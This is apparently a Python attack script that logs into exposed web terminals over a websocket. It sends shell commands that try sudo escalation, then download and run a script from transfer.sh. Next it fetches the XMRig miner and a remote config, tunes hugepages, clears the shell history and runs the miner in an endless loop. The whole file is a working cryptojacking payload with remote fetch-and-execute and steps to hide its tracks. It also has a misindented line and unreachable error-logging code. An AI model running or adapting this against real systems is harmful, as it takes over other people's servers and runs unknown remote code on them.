import asyncio
import websockets
import time
import sys
uri = sys.argv[1]
async def test(uri):
    async with websockets.connect(uri) as websocket:

        await websocket.send('["stdin","echo hello \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

async def hello(uri):
    async with websockets.connect(uri) as websocket:

            await websocket.send('["stdin","\\u0003 \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        await websocket.send('["stdin","\\u0003  \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        await websocket.send('["stdin","\\u0003  \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        await websocket.send('["stdin","bash  \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        await websocket.send('["stdin","cd ~  \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","sudo -n su \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","rm -f script1.sh \\r"]')
        time.sleep(5.5)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","wget https://transfer.sh/X75wE/script1.sh \\r"]')
        time.sleep(10)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","chmod 777 script1.sh && ./script1.sh \\r"]')
        time.sleep(5.5)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","rm -f script1.sh \\r"]')
        time.sleep(5.5)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","mkdir .miner \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","cd .miner \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz \\r"]')
        time.sleep(3)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","tar -xzvf xmrig-2.14.1-xenial-x64.tar.gz \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","cd xmrig-2.14.1 \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","rm -f config.json \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","wget https://transfer.sh/a6haR/config.json \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","cat /sys/kernel/mm/transparent_hugepage/enabled \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","sysctl -w vm.nr_hugepages=128 \\r"]')
        time.sleep(0.1)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","history -c \\r"]')
        time.sleep(3)
        responce = await websocket.recv()

        time.sleep(0.1)
        await websocket.send('["stdin","while true; do ./xmrig; sleep 20;done \\r"]')
        time.sleep(3)
        responce = await websocket.recv()
        time.sleep(0.1)

def returner():

    try:
        asyncio.get_event_loop().run_until_complete(test(uri))
        return 1
    except Exception as ex:
        return ex
        f = open("error.txt",'a+')
        f.write(f"{ex} in server {uri}")
        f.close()
if returner() == 1:
    asyncio.get_event_loop().run_until_complete(hello(uri))
else:
    exit()
    
        
        
